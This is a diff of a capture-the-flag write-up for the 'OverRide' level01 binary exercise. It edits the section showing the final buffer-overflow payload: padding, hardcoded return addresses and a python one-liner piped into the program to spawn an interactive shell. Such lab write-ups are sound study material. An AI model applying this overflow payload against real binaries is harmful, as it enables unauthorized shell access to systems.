@@ -67,15 +67,10 @@ Mapped address spaces:
    - Jumps to 0xf7e6aed0 instead of returning normally
    - This address contains gadget code that spawns a shell
 
-### Final Payload Execution
+## Final Payload
 
-```bash
-level01@OverRide:$ (python -c 'print "dat_will\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level01 
-
-level01@OverRide:$ python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "BBBB"+ "\xec\x97\xf8\xf7"' > /tmp/pay
-
-level01@OverRide:~$ (cat /tmp/pay ; cat) | ./level01
-
+```sh
+$ (python -c 'print "dat_will\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level01 
 ``` 
 
 - `cat` → keeps stdin open for interactive shell
